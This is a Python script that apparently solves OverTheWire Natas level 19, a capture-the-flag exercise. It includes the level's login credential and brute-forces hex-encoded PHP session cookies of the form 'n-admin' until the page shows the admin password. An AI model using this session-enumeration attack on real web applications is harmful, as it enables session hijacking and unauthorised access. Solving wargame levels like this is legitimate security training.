import requests
from requests.auth import HTTPBasicAuth

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas19", "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")

response = requests.get(url, auth=auth, params={"debug": "1"})

for sessID in range(1, 641):
    sessID_encoded = f'{sessID}-admin'.encode().hex()
    headers = { 'Cookie': f'PHPSESSID={sessID_encoded}'}
    response = requests.get(url, auth=auth, headers=headers, params={"debug": "1"})

    check_admin = response.text.split('<div id="content">')[1].split('</div>')[0]

    if ("Password" in check_admin):
       print(check_admin)
       print(f"Session ID: {sessID}")
       break
